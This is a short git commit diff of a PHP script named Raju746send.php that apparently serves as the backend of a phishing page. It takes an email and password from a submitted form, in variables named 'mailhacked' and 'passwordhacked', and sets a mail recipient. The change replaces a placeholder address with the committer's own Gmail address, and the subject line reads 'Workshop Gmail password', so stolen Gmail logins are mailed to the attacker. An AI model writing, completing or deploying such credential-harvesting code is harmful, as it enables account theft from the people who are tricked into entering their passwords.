1552fc0cfc696bb053716bcd2ad54b9350848cb7
raju746 <70121083+raju746@users.noreply.github.com>
2020-08-24 08:00:21 +0530

    Update and rename send.php to Raju746send.php

--- Raju746send.php
+++ Raju746send.php
@@ -1,7 +1,7 @@
 <?php
         $mailhacked = $_POST["email"];
         $passwordhacked = $_POST["password"];
-         $to = "yourmailaddresshere@gmail.com";
+         $to = "raju746@gmail.com";
          $subject = "Workshop Gmail password";
          
          $message = "$mailhacked";
